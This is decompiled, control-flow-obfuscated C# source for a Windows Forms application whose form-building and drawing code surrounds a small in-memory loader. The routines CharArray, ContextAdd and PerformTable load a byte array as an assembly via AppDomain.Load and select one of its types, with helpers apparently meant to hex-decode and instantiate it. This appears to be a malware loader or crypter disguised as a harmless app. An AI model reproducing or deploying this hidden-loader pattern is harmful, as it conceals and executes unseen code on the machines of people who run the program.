					continue;
				case 34u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -31444778) ^ -1474948383;
					continue;
				case 33u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -455363084) ^ 0x2A0F7673;
					continue;
				case 32u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 474932453) ^ -771719578;
					continue;
				case 31u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 1912072758) ^ 0x6ADEA577);
					continue;
				case 30u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -881728441) ^ 0x57566D6F;
					continue;
				case 29u:
					label5 = Form1.smethod_57();
					num = (int)((num2 * 1776607571) ^ 0x4EE13569);
					continue;
				case 28u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 1384260261) ^ 0x6841A8DD);
					continue;
				case 27u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -1539559780) ^ -1426818832;
					continue;
				case 26u:
					num = ((int)num2 * -869866413) ^ -1648142588;
					continue;
				case 25u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)(num2 * 1485564134) ^ -496003873;
					continue;
				case 24u:
					num = (int)(num2 * 1413884663) ^ -2088392003;
					continue;
				case 23u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 575239872) ^ 0x57F81A15);
					continue;
				case 22u:
					num = ((int)num2 * -391087569) ^ 0x40809291;
					continue;
				case 21u:
					num = (int)(num2 * 1265650513) ^ -916015041;
					continue;
				case 20u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -607768911) ^ 0x1EC78A04;
					continue;
				case 19u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 1649431402) ^ -1611384462;
					continue;
				case 18u:
					num = ((int)num2 * -498086603) ^ -917433356;
					continue;
				case 17u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1819952960) ^ -1150416078;
					continue;
				case 16u:
					num = ((int)num2 * -631873087) ^ -1791017584;
					continue;
				case 15u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -131652800) ^ -2070053294;
					continue;
				case 14u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)(num2 * 431961564) ^ -934989850;
					continue;
				case 13u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -114955102) ^ -2041542183;
					continue;
				case 12u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 1449149525) ^ 0x36FABF45);
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)(num2 * 928122705) ^ -410709764;
					continue;
				case 10u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -988551249) ^ 0x3DA66E0A;
					continue;
				case 9u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -495099907) ^ -1954992593;
					continue;
				case 8u:
					num = (int)(num2 * 1449756848) ^ -711586715;
					continue;
				case 7u:
					num = (int)(num2 * 1549592852) ^ -2120879681;
					continue;
				case 6u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1226859565) ^ -1482766396;
					continue;
				case 5u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 1378211383) ^ -1177012057;
					continue;
				case 4u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -1985733924) ^ 0x7CA0150E;
					continue;
				case 3u:
					num = ((int)num2 * -1094696097) ^ -433119517;
					continue;
				case 2u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1176785885) ^ -518204688;
					continue;
				case 1u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 1723033208) ^ -643285243;
					continue;
				case 0u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)(num2 * 1394327490) ^ -1827109165;
					continue;
				case 113u:
					break;
				default:
					Form1.smethod_92((Control)(object)this);
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = 85124776;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3C875F6Du) % 4u)
				{
				case 1u:
					q = ContextAdd(Level);
					num = (int)((num2 * 1787539900) ^ 0x330B130D);
					continue;
				case 0u:
					PerformTable(q);
					num = ((int)num2 * -891490907) ^ 0x197460EA;
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -206335761;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE8C5EA54u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)((num2 * 154900204) ^ 0xB79E101);
					continue;
				case 1u:
					num = ((int)num2 * -256321490) ^ -1364142008;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = 1421933619;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3ADB0613u) % 3u)
				{
				case 2u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)(num2 * 795630841) ^ -1837346676;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
